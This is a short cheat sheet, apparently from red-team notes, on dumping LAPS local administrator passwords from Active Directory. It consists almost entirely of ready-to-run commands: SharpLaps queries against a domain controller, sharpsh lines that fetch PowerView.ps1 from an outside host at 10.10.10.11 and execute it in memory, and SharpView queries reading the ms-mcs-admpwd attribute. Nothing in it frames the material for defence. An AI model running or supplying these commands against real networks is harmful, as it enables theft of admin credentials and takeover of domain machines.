# LAPS

### 1) SharpLaps with C# support - Without target specified, we get creds for all machines fetched from DC

    sharplaps /host:DC06
    sharplaps /host:DC06 /target:machine04
    sharplaps /host:DC06 /target:client


### 2) If you have rights to read passwords, you can use powerview's get-computer for getting the secrets as well

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine04.domain.com"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine02.domain.com"'

### 3) SharpView can be used as well

    sharpview -- 'Get-DomainComputer -Identity machine03.domain.com -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
    sharpview -- 'Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
